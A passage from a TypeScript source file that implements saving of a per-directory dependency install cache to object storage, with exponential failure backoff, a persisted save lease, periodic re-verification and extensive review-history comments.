// not changed 300s later. Measured: 10 consecutive ticks, 10 re-tars, for a
// condition that in practice resolves on the order of hours (a maestro
// trimming a dependency, a container recycling onto a host with more free
// disk) or not at all until the lockfile itself changes.
//
// Deliberately a BACKOFF, not a permanent give-up (unlike
// SURVIVAL_RETRY_MAX_ATTEMPTS's own "gave-up, stop trying" posture for a
// re-brief that has a hard reason to stop): a full disk or an oversized
// `node_modules` is a condition that can genuinely resolve itself without
// this studio ever seeing a NEW lockHash, so retrying forever (just, not
// EVERY tick) is the correct end state, not "stop and require a lockfile
// change to ever try again". Keyed to the EXACT `lockHash` that failed: the
// instant the lockfile changes, the backoff for the OLD hash is irrelevant
// (a new hash has never failed) and the new hash gets an immediate first
// attempt, no inherited cooldown.
// ---------------------------------------------------------------------------

export interface InstallCacheFailureRecord {
  lockHash: string;
  attempts: number;
  lastFailedAt: string;
  reason: string;
}

/** DO storage key for the last save FAILURE recorded for one (studio,
 *  directory) pair. Absent (or for a DIFFERENT lockHash than the one being
 *  attempted right now) means no backoff applies. */
export function installCacheFailureKey(dirSlug: string): string {
  return `installCacheFailure:${dirSlug}`;
}

/** `storage.get(installCacheFailureKey(...))`'s raw value, parsed —
 *  `null` for absent/malformed JSON/a shape missing a required field, the
 *  same "refuse rather than guess" posture `parseLockHash`/`parseSaveOutcome`
 *  already take on their own storage-adjacent inputs in this file. */
export function parseInstallCacheFailure(raw: string | undefined): InstallCacheFailureRecord | null {
  if (!raw) return null;
  try {
    const parsed: unknown = JSON.parse(raw);
    if (
      parsed !== null && typeof parsed === "object"
      && typeof (parsed as Record<string, unknown>).lockHash === "string"
      && typeof (parsed as Record<string, unknown>).attempts === "number"
      && typeof (parsed as Record<string, unknown>).lastFailedAt === "string"
    ) {
      const p = parsed as Record<string, unknown>;
      return {
        lockHash: p.lockHash as string,
        attempts: p.attempts as number,
        lastFailedAt: p.lastFailedAt as string,
        reason: typeof p.reason === "string" ? p.reason : "unknown",
      };
    }
  } catch {
    // fall through to null below — a malformed record is treated exactly
    // like no record at all, never as a reason to throw out of a save tick.
  }
  return null;
}

/** Backoff FLOOR — the shortest cooldown a first failure ever gets. Short
 *  enough that a transient failure (a momentary disk-pressure blip from some
 *  OTHER process on the container) is retried within a couple of sync ticks
 *  (session-sync.ts's 300s cadence), not held back for the exponential
 *  schedule's full climb. */
export const INSTALL_CACHE_FAILURE_BACKOFF_BASE_MS = 5 * 60 * 1000;

/** Backoff CEILING — however many consecutive failures pile up for one
 *  lockHash, the cooldown never exceeds this. 24h bounds the worst case
 *  (this studio simply stops burning cycles/bandwidth on a condition that
 *  has now failed many times in a row) while still eventually giving a
 *  resolved condition (freed disk, a trimmed dependency after a NEW lockHash
 *  arrives anyway, which resets this entirely) a same-day retry. */
export const INSTALL_CACHE_FAILURE_BACKOFF_MAX_MS = 24 * 60 * 60 * 1000;

/** Exponential backoff, doubling per consecutive failure of the SAME
 *  lockHash, capped at `INSTALL_CACHE_FAILURE_BACKOFF_MAX_MS`. Pure, so the
 *  schedule itself (5m, 10m, 20m, 40m, ... capped at 24h) is pinned by a test
 *  independent of any fake clock/storage plumbing. */
export function installCacheFailureBackoffMs(attempts: number): number {
  const exponent = Math.max(0, attempts - 1);
  // Math.pow, not `2 ** exponent`, keeps this readable at a glance; capped
  // well before the exponent could ever produce a value large enough for
  // that distinction to matter (the MAX cap below always wins by attempt 9).
  return Math.min(INSTALL_CACHE_FAILURE_BACKOFF_BASE_MS * Math.pow(2, exponent), INSTALL_CACHE_FAILURE_BACKOFF_MAX_MS);
}

/** Is a real save attempt for `lockHash` still inside its own backoff
 *  cooldown, per the last recorded failure? `false` for no record, a record
 *  for a DIFFERENT (already-superseded) lockHash, or a record whose own
 *  `lastFailedAt` fails to parse (never grant infinite backoff over a
 *  storage-shape problem — same "refuse to trust what can't be trusted, but
 *  never worse than not having the feature" posture this file's other
 *  refusal points already take). */
export function installCacheFailureBackoffActive(
  failure: InstallCacheFailureRecord | null, lockHash: string, now: Date,
): boolean {
  if (failure === null || failure.lockHash !== lockHash) return false;
  const elapsed = now.getTime() - new Date(failure.lastFailedAt).getTime();
  if (!Number.isFinite(elapsed) || elapsed < 0) return false;
  return elapsed < installCacheFailureBackoffMs(failure.attempts);
}

// ---------------------------------------------------------------------------
// Round 3 review, item 3 — a storage-persisted LEASE for the detached save
// (do.ts's own fire-and-forget IIFE around runInstallCacheSaveTick), the
// second of two guard layers against overlapping saves of the same
// (studio, directory, hash): an in-memory flag (do.ts, scoped per DO
// instance so it survives across ticks within one isolate's lifetime, gone
// the instant that isolate is evicted/restarted) stops two ticks in the SAME
// isolate from both starting a save concurrently — the measured failure mode
// (5 overlapping ticks, 3 full saves of the same dir/hash) — but does
// nothing for an isolate EVICTION mid-save: the in-memory flag disappears
// with the dead isolate, and a fresh isolate's own next tick, seeing no
// in-memory trace at all, would start a SECOND save while the first (now
// orphaned, but possibly still genuinely running inside its own still-alive
// container exec) is underway. This lease is what the fresh isolate can
// still see.
//
// Same shape as provision.ts's operationLockFresh/destroyingMarkerFresh:
// stale past its own budget, so a lease left behind by an isolate that died
// before ever reaching its own `finally` does not block saves forever — the
// #81 permanent-disable lesson those two locks already apply to themselves,
// applied here to this one.
// ---------------------------------------------------------------------------

export const INSTALL_CACHE_SAVE_LEASE_KEY = "installCacheSaveLease";

/** How long a save lease is trusted before being treated as abandoned. Sized
 *  against the REAL worst case this feature can produce, not a nominal
 *  single-directory save: `runInstallCacheSaveTick` loops over every
 *  discovered directory SEQUENTIALLY in one call (do.ts's detached IIFE is
 *  exactly one such call per tick), and `installCacheSaveCmd`'s own PUT
 *  alone is allowed up to 900s (`--max-time 900`) before tar/zstd wall-clock
 *  on top of that. `example-org/websites` — this feature's own first and
 *  largest known target — has 9 such directories: 9 * 900s ~= 135 minutes
 *  worst case on the curl legs alone. 3 hours leaves wide headroom above
 *  that (a future gated repo with more directories, plus real tar/zstd time)
 *  without leaving a genuinely dead isolate's lease blocking saves anywhere
 *  near as long as OPERATION_STALE_MS's own 15 minutes would — that budget
 *  is sized for a single provision/restart, not a multi-directory,
 *  multi-hundred-second upload chain, and reusing it here would false-
 *  positive "abandoned" on a save that is still perfectly healthy. */
export const INSTALL_CACHE_SAVE_LEASE_STALE_MS = 3 * 60 * 60 * 1000;

/** Is a persisted save lease still fresh (a genuinely in-flight save — this
 *  isolate, or, before an eviction, a PRIOR one — may still be inside it), or
 *  stale (old enough that whatever isolate set it is presumed dead, so a new
 *  save may start)? `since` is an ISO timestamp, or absent/the empty string
 *  for "no lease held" — `InstallCacheSaveStorage`'s own `put()` can only
 *  ever write a `string` (unlike `StudioStorage`'s typed `OPERATION_KEY`,
 *  which can hold a real `null`), so the empty string is this port's own
 *  "cleared" sentinel; `!since` reads it the same way
 *  provision.ts's `destroyingMarkerFresh` already reads its own absent
 *  string-keyed marker. */
export function installCacheSaveLeaseFresh(since: string | undefined, now: Date): boolean {
  if (!since) return false;
  const age = now.getTime() - new Date(since).getTime();
  return Number.isFinite(age) && age >= 0 && age < INSTALL_CACHE_SAVE_LEASE_STALE_MS;
}

export interface InstallCacheSaveStorage {
  get(key: string): Promise<string | undefined>;
  put(key: string, value: string): Promise<void>;
}

export type InstallCacheSaveOutcome =
  | "skip:install-running" | "skip:no-lockfile" | "unchanged" | "already-cached"
  | "skip:no-object-url" | "skip:save-failed" | "skip:save-backoff" | "skip:unsafe-path" | "saved";

export interface InstallCacheDirSaveResult {
  relDir: string; dirSlug: string; attempted: boolean; outcome: InstallCacheSaveOutcome;
}

/** See `InstallCacheRestoreResult`'s own doc comment — the same "plain
 *  string summary, empty `dirs` for a top-level refusal" shape, for the
 *  save side's own top-level refusals (`gate:off`, `no-repo`,
 *  `skip:no-lockfile` when discovery finds nothing at all). */
export interface InstallCacheSaveResult {
  attempted: boolean;
  outcome: string;
  dirs: InstallCacheDirSaveResult[];
}

async function saveOneDir(
  deps: InstallCacheSaveDeps, storage: InstallCacheSaveStorage,
  id: string, workRepoSlug: string, repoDir: string, relDir: string,
): Promise<InstallCacheDirSaveResult> {
  const dir = absoluteCacheDir(repoDir, relDir);
  const slug = await dirSlug(relDir);

  // Round 2 review, item 3: never tar a directory mid-install. Checked
  // FIRST, before even hashing — a directory whose install is still running
  // has nothing stable to hash OR tar yet in any way that matters here.
  // Round 4 review, item 3 — the same real, filesystem-level containment
  // check restoreOneDir now runs (guardDirWithinRepo's own doc comment),
  // wrapped around bunInstallRunningCmd, the first per-directory command this
  // flow already ran — no extra sbExec call added.
  const runningRes = await deps.sbExec(guardDirWithinRepo(repoDir, dir, bunInstallRunningCmd(dir)));
  if (runningRes.stdout.trim() === "unsafe-path") {
    console.error(`install cache save of ${relDir || "."} refused: resolves outside the checkout root`);
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:unsafe-path" };
  }
  if (parseBunInstallRunning(runningRes.stdout)) {
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:install-running" };
  }

  const hashRes = await deps.sbExec(lockHashCmd(dir));
  const lockHash = parseLockHash(hashRes.stdout);
  if (lockHash === null) {
    return { relDir, dirSlug: slug, attempted: false, outcome: "skip:no-lockfile" };
  }

  const hashKey = installCacheHashKey(slug);
  const reverifyKey = installCacheReverifyKey(slug);
  const failureKey = installCacheFailureKey(slug);

  // Round 5 review, item 2 — the maestro's own reported bug: a throw at ANY
  // stage from HERE onward (r2Head, storage, presign, or the save exec
  // itself) used to propagate all the way out of this function, into
  // runInstallCacheSaveTick's own per-directory catch, which had no access to
  // `lockHash` and tried to RECOMPUTE it with a brand-new sbExec call to
  // record a failure at all. That recompute is exactly the call most likely
  // to ALSO fail — the maestro's own measured case is an exec-deadline
  // firing, which makes sbExec's session ABANDONED (sandbox-api.ts's
  // SessionBusyError) for every further call, including the recompute — so
  // the recompute throws too, is caught by its OWN inner try/catch, logged,
  // and NOTHING is ever recorded. The next tick re-tars a potentially
  // multi-GiB node_modules from scratch, forever, defeating round 4's own
  // item 4 backoff fix entirely for exactly the case (a thrown save exec)
  // that fix was written for.
  //
  // Fixed by wrapping everything from here on in ONE try/catch that already
  // has `lockHash`/`slug`/`failureKey` in scope — no recompute needed, ever,
  // for a throw at this point. A caught throw writes a failure record with
  // the SAME shape saveOneDir's own non-throwing failure path already writes
  // (attempts count keyed to this exact lockHash, same backoff), and returns
  // a normal outcome instead of re-throwing. runInstallCacheSaveTick's own
  // outer catch is now a pure backstop for something EARLIER than this
  // point throwing (before any lockHash exists yet — bunInstallRunningCmd,
  // guardDirWithinRepo, or the initial lockHashCmd itself) — that case
  // correctly stays record-less exactly as before: there is no hash yet to
  // record a failure against, so "rebuild next tick" is still the right
  // (and only possible) answer, unchanged by this fix.
  try {
    const lastHandled = await storage.get(hashKey);

    // Round 3 review, item 1: this used to `return "unchanged"` unconditionally
    // the instant `lastHandled === lockHash`, which meant EVERY tick after the
    // first one that ever set `hashKey` took this exact branch, forever, and
    // the reverify streak below (which only the `r2Head`-true branch touched)
    // was never reached again for that hash — permanently freezing it and
    // defeating INSTALL_CACHE_REVERIFY_EVERY's whole point. Fixed by making
    // THIS branch also own (and eventually exhaust) that same streak: the
    // cheap "unchanged" exit still holds for every tick within the window
    // (identical cost to before — zero r2Head/R2 calls), but once the streak
    // is exhausted, this branch does NOT return early — it falls through into
    // the exact same r2Head-driven real-verify logic below that a genuinely
    // NEW hash already takes, so a corrupted/missing background object for a
    // hash that hasn't itself changed still eventually gets a real check (and
    // a real re-save if that check finds it gone).
    if (lastHandled === lockHash) {
      const streak = Number(await storage.get(reverifyKey)) || 0;
      if (streak < INSTALL_CACHE_REVERIFY_EVERY) {
        await storage.put(reverifyKey, String(streak + 1));
        return { relDir, dirSlug: slug, attempted: false, outcome: "unchanged" };
      }
      // Streak exhausted while nothing about the lockfile changed: a genuine
      // re-verify is due. Reset HERE, unconditionally, before even calling
      // r2Head below — this is the one and only place this "unchanged, forced
      // re-verify" path resets the counter, so whatever the real check below
      // finds (object still healthy, object gone, a fresh save that succeeds
      // OR fails), this hash's trust window restarts fresh from this real
      // check rather than staying pinned at the exhausted value forever (which
      // would otherwise force a REAL r2Head call on every remaining tick, not
      // just periodically — the same class of bug this fix exists to close).
      await storage.put(reverifyKey, "0");
    }

    const key = installCacheKey(workRepoSlug, slug, lockHash);
    if (await deps.r2Head(key)) {
      const streak = Number(await storage.get(reverifyKey)) || 0;
      if (streak < INSTALL_CACHE_REVERIFY_EVERY) {
        await storage.put(hashKey, lockHash);
        await storage.put(reverifyKey, String(streak + 1));
        return { relDir, dirSlug: slug, attempted: false, outcome: "already-cached" };
      }
      // Streak exhausted (a genuinely NEW hash inherited a stale streak from
      // whatever this dirSlug's counter last held): fall through to a REAL
      // save attempt below instead of trusting r2Head again, so a stale/bad
      // object at this key eventually gets a chance to be overwritten. Reset
      // regardless of whether the upload below itself succeeds — this bounds
      // how long the short-circuit alone is trusted, it does not promise every
      // Nth attempt succeeds.
      await storage.put(reverifyKey, "0");
    }

    // Round 3 review, item 4: don't re-attempt (and re-tar a potentially
    // multi-GiB node_modules) every single tick when the LAST attempt at this
    // exact (directory, lockHash) pair just failed for a reason that probably
    // hasn't changed yet (disk still full, node_modules still oversize). Keyed
    // to `lockHash` specifically: a NEW lockfile has never failed and gets an
    // immediate attempt with no inherited cooldown, matching the "unchanged"
    // fast path's own "never blocks a genuinely different hash" shape.
    const failure = parseInstallCacheFailure(await storage.get(failureKey));
    if (installCacheFailureBackoffActive(failure, lockHash, deps.now())) {
      return { relDir, dirSlug: slug, attempted: false, outcome: "skip:save-backoff" };
    }

    const url = await deps.presignPut(key);
    if (url === null) {
      // Deliberately does NOT persist `lockHash` here — the next tick retries
      // from scratch, exactly like runInstallCacheRestore's identical
      // "skip:no-object" leaves nothing cached for a LATER tick/studio to find
      // either. A persisted failure would be indistinguishable from a
      // persisted success on the next tick's `lastHandled === lockHash` check.
      return { relDir, dirSlug: slug, attempted: false, outcome: "skip:no-object-url" };
    }
    const saveRes = await deps.sbExec(installCacheSaveCmd(dir), { [INSTALL_CACHE_URL_ENV]: url });
    const { saved, reason } = parseSaveOutcome(saveRes.stdout);
    if (saveRes.code !== 0 || !saved) {
      console.error(
        `studio ${id}: install cache save of ${relDir || "."} failed (${saveRes.code}, ${reason}): ${saveRes.stderr.slice(0, 500)}`,
      );
      const attempts = failure !== null && failure.lockHash === lockHash ? failure.attempts + 1 : 1;
      const record: InstallCacheFailureRecord = { lockHash, attempts, lastFailedAt: deps.now().toISOString(), reason };
      await storage.put(failureKey, JSON.stringify(record));
      return { relDir, dirSlug: slug, attempted: true, outcome: "skip:save-failed" };
    }
    await storage.put(hashKey, lockHash);
    const objects = await deps.r2List(installCachePrefix(workRepoSlug, slug));
    const stale = keysToPrune(objects);
    if (stale.length > 0) await deps.r2Delete(stale);
    return { relDir, dirSlug: slug, attempted: true, outcome: "saved" };
  } catch (err) {
    console.error(
      `studio ${id}: install cache save of ${relDir || "."} threw at a later stage (lockHash already known)`,
      err instanceof Error ? err.message : String(err),
    );
    // Best-effort: re-read any existing failure record for this hash so the
    // attempts count keeps escalating correctly. If THIS also throws (the
    // same abandoned session), fall back to attempts=1 rather than losing
    // the record entirely — the point of this catch is recording SOMETHING
    // real, using the lockHash already in scope, not a perfectly accurate
    // attempts count.
    let existing: InstallCacheFailureRecord | null = null;
    try {
      existing = parseInstallCacheFailure(await storage.get(failureKey));
    } catch {
      existing = null;
    }
    const attempts = existing !== null && existing.lockHash === lockHash ? existing.attempts + 1 : 1;
    const record: InstallCacheFailureRecord = {
      lockHash, attempts, lastFailedAt: deps.now().toISOString(),
      reason: err instanceof Error ? err.message.slice(0, 200) : "threw",
    };
    try {
      await storage.put(failureKey, JSON.stringify(record));
    } catch (putErr) {
      console.error(
        `studio ${id}: install cache save of ${relDir || "."}: failure-record write also failed`,
        putErr instanceof Error ? putErr.message : String(putErr),
      );
    }
    return { relDir, dirSlug: slug, attempted: true, outcome: "skip:save-failed" };
  }
}

/**
 * One sync tick's worth of install-cache save work, across every cache-
 * worthy directory the repo contains. Same gate-first ordering discipline as
 * runInstallCacheRestore above, for the identical mutant-proof reason: a
 * repo not in INSTALL_CACHE_REPOS must make zero execs and zero R2 calls,
 * full stop — checked BEFORE `workRepoSlug` is even looked at for null.
 *
 * Never throws: a single directory's own sbExec/R2 call throwing (a network
 * blip, a malformed sandbox-api response) is caught right at that
 * directory, reported as its own `skip:save-failed`, and does not stop the
 * OTHER directories in the same repo from getting their own save attempt
 * this tick.
 *
 * Round 4 review, item 4, mostly SUPERSEDED by round 5's own fix (commit
 * 2f89923) — read this alongside `saveOneDir`'s own inner try/catch comment
 * above (the block starting "Round 5 review, item 2") for the full, current
 * two-layer picture; this comment describes what is ACTUALLY still reachable
 * here today, not the original round-4 problem in isolation.
 *
 * ORIGINAL problem (round 4): a THROWN save exec (an exec deadline, a
 * "session busy" conflict — `sbExec` itself throwing, rather than returning
 * an ordinary nonzero exit code) used to be caught right HERE with no
 * failure record written at all, unlike `saveOneDir`'s OWN internal failure
 * path (a nonzero exit / non-"saved" outcome), which already wrote one
 * (`installCacheFailureKey`/`InstallCacheFailureRecord`, round 3 review, item
 * 4's own backoff). That meant a throwing exec bypassed the backoff entirely
 * and retried — potentially re-tarring a multi-GiB `node_modules` — on every
 * single tick, forever. Round 4's own fix recomputed `lockHash` right here,
 * with one more, cheap, read-only `lockHashCmd` exec, since the value
 * `saveOneDir` had in scope at the moment it threw was gone along with its
 * stack frame.
 *
 * CURRENT reality (round 5 onward): `saveOneDir`'s own inner try/catch is now
 * the PRIMARY, more reliable path for exactly the case this comment used to
 * describe. It already has `lockHash` in scope — no recompute needed, and no
 * risk of that recompute itself throwing on the very same wedged sandbox
 * that made the original exec throw, which is precisely the failure mode the
 * maestro measured live against round 4's own fix (a thrown exec that made
 * the SESSION itself abandoned, so the recompute below threw too, and
 * nothing was ever recorded). `saveOneDir`'s own catch handles every throw
 * from the point `lockHash` is first computed onward — `r2Head`, storage,
 * `presignPut`, the save exec itself.
 *
 * THIS catch (in the loop below) is now reachable only for a throw EARLIER
 * than that: before `saveOneDir` ever computes a lockHash at all — its own
 * very first steps, `guardDirWithinRepo`/`bunInstallRunningCmd`, or the
 * initial `lockHashCmd` call itself throwing (rather than merely returning
 * something `parseLockHash` refuses). The recompute below still makes sense
 * for THIS narrower case — there genuinely is no lockHash anywhere in scope
 * to reuse, unlike the case round 5's fix now handles — and if the recompute
 * ALSO throws (the same underlying condition that made the original exec
 * throw, e.g. a wedged sandbox), this deliberately records NOTHING rather
 * than guess: a failure record keyed to the WRONG lockHash would never
 * activate backoff for the hash that actually failed, which is worse than
 * recording nothing at all.
 */
export async function runInstallCacheSaveTick(
  deps: InstallCacheSaveDeps, storage: InstallCacheSaveStorage,
  id: string, workRepoSlug: string | null,
): Promise<InstallCacheSaveResult> {
  if (workRepoSlug === null || !isInstallCacheRepo(deps.installCacheRepos, workRepoSlug)) {
    return { attempted: false, outcome: workRepoSlug === null ? "no-repo" : "gate:off", dirs: [] };
  }
  // Round 2 review, smaller items: routed through repoCheckoutDirName, not a
  // bare `workRepoSlug.split("/").pop()` — see that function's own doc
  // comment for the dotted-repo-name bug this fixes.
  const repoDir = `/workspace/${repoCheckoutDirName(workRepoSlug)}`;
  let relDirs: string[];
  try {
    const discoverRes = await deps.sbExec(discoverCacheDirsCmd(repoDir));
    relDirs = parseCacheDirs(discoverRes.stdout);
  } catch (err) {
    console.error(`studio ${id}: install cache directory discovery failed`, err instanceof Error ? err.message : String(err));
    return { attempted: false, outcome: "skip:save-failed", dirs: [] };
  }
  if (relDirs.length === 0) {
    return { attempted: false, outcome: "skip:no-lockfile", dirs: [] };
  }
  const dirs: InstallCacheDirSaveResult[] = [];
  for (const relDir of relDirs) {
    try {
      dirs.push(await saveOneDir(deps, storage, id, workRepoSlug, repoDir, relDir));
    } catch (err) {
      console.error(
        `studio ${id}: install cache save of ${relDir || "."} threw`,
        err instanceof Error ? err.message : String(err),
      );
      const slug = await dirSlug(relDir);
      // Round 4 review, item 4 — best-effort: record a failure for this
      // throw too, so it is subject to the SAME backoff window as an
      // ordinary (non-throwing) save failure. See this function's own doc
      // comment for why a failed recompute here records nothing at all.
      try {
        const dir = absoluteCacheDir(repoDir, relDir);
        const hashRes = await deps.sbExec(lockHashCmd(dir));
        const lockHash = parseLockHash(hashRes.stdout);
        if (lockHash !== null) {
          const failureKey = installCacheFailureKey(slug);
          const existing = parseInstallCacheFailure(await storage.get(failureKey));
          const attempts = existing !== null && existing.lockHash === lockHash ? existing.attempts + 1 : 1;
          const record: InstallCacheFailureRecord = {
            lockHash, attempts, lastFailedAt: deps.now().toISOString(),
            reason: err instanceof Error ? err.message.slice(0, 200) : "threw",
          };
          await storage.put(failureKey, JSON.stringify(record));
        }
      } catch (recomputeErr) {
        console.error(
          `studio ${id}: install cache save of ${relDir || "."}: failure-record recompute also failed`,
          recomputeErr instanceof Error ? recomputeErr.message : String(recomputeErr),
        );
      }
      dirs.push({ relDir, dirSlug: slug, attempted: false, outcome: "skip:save-failed" });
    }
  }
  return {
    attempted: dirs.some((d) => d.attempted),
    outcome: dirs.map((d) => `${d.relDir || "."}:${d.outcome}`).join(", "),
    dirs,
  };
}
